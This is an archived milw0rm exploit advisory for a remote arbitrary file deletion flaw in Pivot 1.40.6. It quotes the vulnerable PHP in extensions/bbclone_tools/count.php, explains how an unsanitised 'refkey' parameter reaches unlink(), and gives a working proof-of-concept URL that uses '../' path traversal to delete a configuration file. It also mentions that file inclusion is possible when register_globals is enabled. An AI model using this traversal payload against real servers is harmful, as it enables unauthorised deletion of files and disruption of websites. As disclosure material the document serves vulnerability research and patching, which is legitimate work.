<html><head><title>Pivot 1.40.6 Remote Arbitrary File Deletion Vulnerability</title></head><pre>Pivot 1.40.6 Remote File Delete 

Alfons Luja

Vuln :
     
     extensions/bbclone_tools/hr_conf.php line 20

       ...
 
       $bbclone_debug = false;  //is never change 

       ...
 
=========================================================
       
    extensions/bbclone_tools/count.php


      ...


      if ( ($_GET[&quot;refkey&quot;]!=&quot;&quot;) &amp;&amp; file_exists(&quot;$refkeydir/&quot;.$_GET[&quot;refkey&quot;])) {   [1]

	if ($bbclone_debug==true) { echo &quot;Refkey found..&lt;br /&gt;&quot;; }

	// Getting the time offset between the web and file server (if there is any)
	$offset = timediffwebfile($bbclone_debug);

	if ((time() - filectime(&quot;$refkeydir/&quot;.$_GET[&quot;refkey&quot;])) &lt; (1000+$offset)) {   [2]
         
		include(&quot;do_count.php&quot;);
		if ($bbclone_debug!=true) {
			header(&quot;content-type:image/gif&quot;);
			readfile(&quot;pixel.gif&quot;);
		} else {
			echo &quot;Counted normally&quot;;
		}
		die();

	} else if ($bbclone_debug==true) {
		echo &quot;too old!&quot;;
	}

	if ($bbclone_debug!=true) {                                                    [3]
		unlink(&quot;$refkeydir/&quot;.$_GET[&quot;refkey&quot;]);
	}
}

      ...


1] . We can put existent file 

2] . Time dependences 
     If current time - last modification time &lt; 1000 + $offset (usually 1001,1002 not more)
     We must wait a moment other way 'exploit dosent work'  

3] . $bbclone_debug is always false so if condition from point [2] == false 
     We can delete some file 
   

If register globals is ON we can using this bug to include some file  

poc :

http://www.pentagon.gov/~pivot_1406_full/extensions/bbclone_tools/count.php?refkey=../../../extensions/bbclone_tools/hr_conf.php

# milw0rm.com [2009-03-18]</pre></html>